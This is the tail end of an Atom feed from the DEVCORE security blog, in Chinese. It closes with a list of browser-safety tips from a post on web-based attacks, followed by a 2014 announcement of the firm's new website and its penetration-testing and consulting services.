  &lt;li&gt;安裝 NoScript 類型套件，僅允許可信賴的網站執行 JavaScript&lt;/li&gt;
  &lt;li&gt;開啟「彈出式視窗」阻擋功能，並將網站安全性等級提高。&lt;/li&gt;
  &lt;li&gt;安裝 AdBlock 等廣告阻擋套件（但會影響網站營收）&lt;/li&gt;
  &lt;li&gt;使用最新版本瀏覽器以策安全&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;網頁型的攻擊越來越多樣化，除了依賴瀏覽器本身的保護並輔以第三方安全套件之外，更需要使用者本身的安全意識，才能安心暢快的瀏覽網路！&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>DEVCORE 新網站上線！</title>
   <link href="http://devco.re/blog/2014/02/27/devcore-new-website/"/>
   <updated>2014-02-27T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/02/27/devcore-new-website</id>
   <content type="html">
&lt;p&gt;DEVCORE 的新網站上線了！&lt;br /&gt;
非常感謝專業的 &lt;a href=&quot;http://evendesign.tw/&quot;&gt;EVENDESIGN&lt;/a&gt; 幫我們設計精美的網站！&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;我們目前主要服務項目為滲透測試、資安教育訓練、資安事件處理、資安顧問服務，&lt;br /&gt;
各項服務的詳細內容可參考 &lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Services&lt;/a&gt; 頁面。&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;同時，在官網中我們將會不定期提供最新的資安新知及技術文章，&lt;br /&gt;
希望藉由我們的力量讓大眾更清楚資訊安全的重要。&lt;br /&gt;
並且透過站內的教學文獻，讓開發者、管理者進一步了解駭客的思維、攻防的手法，&lt;br /&gt;
知己知彼，才能百戰不怠。瞭解如何攻擊，更能知道如何防禦。&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;若對我們的網站內容或服務有任何建議，歡迎您隨時與我們聯繫。&lt;br /&gt;
希望我們能為您的企業資訊安全最佳把關者！&lt;br /&gt;
歡迎隨時聯絡我們！ &lt;code&gt;contact [at] devco.re&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 
</feed>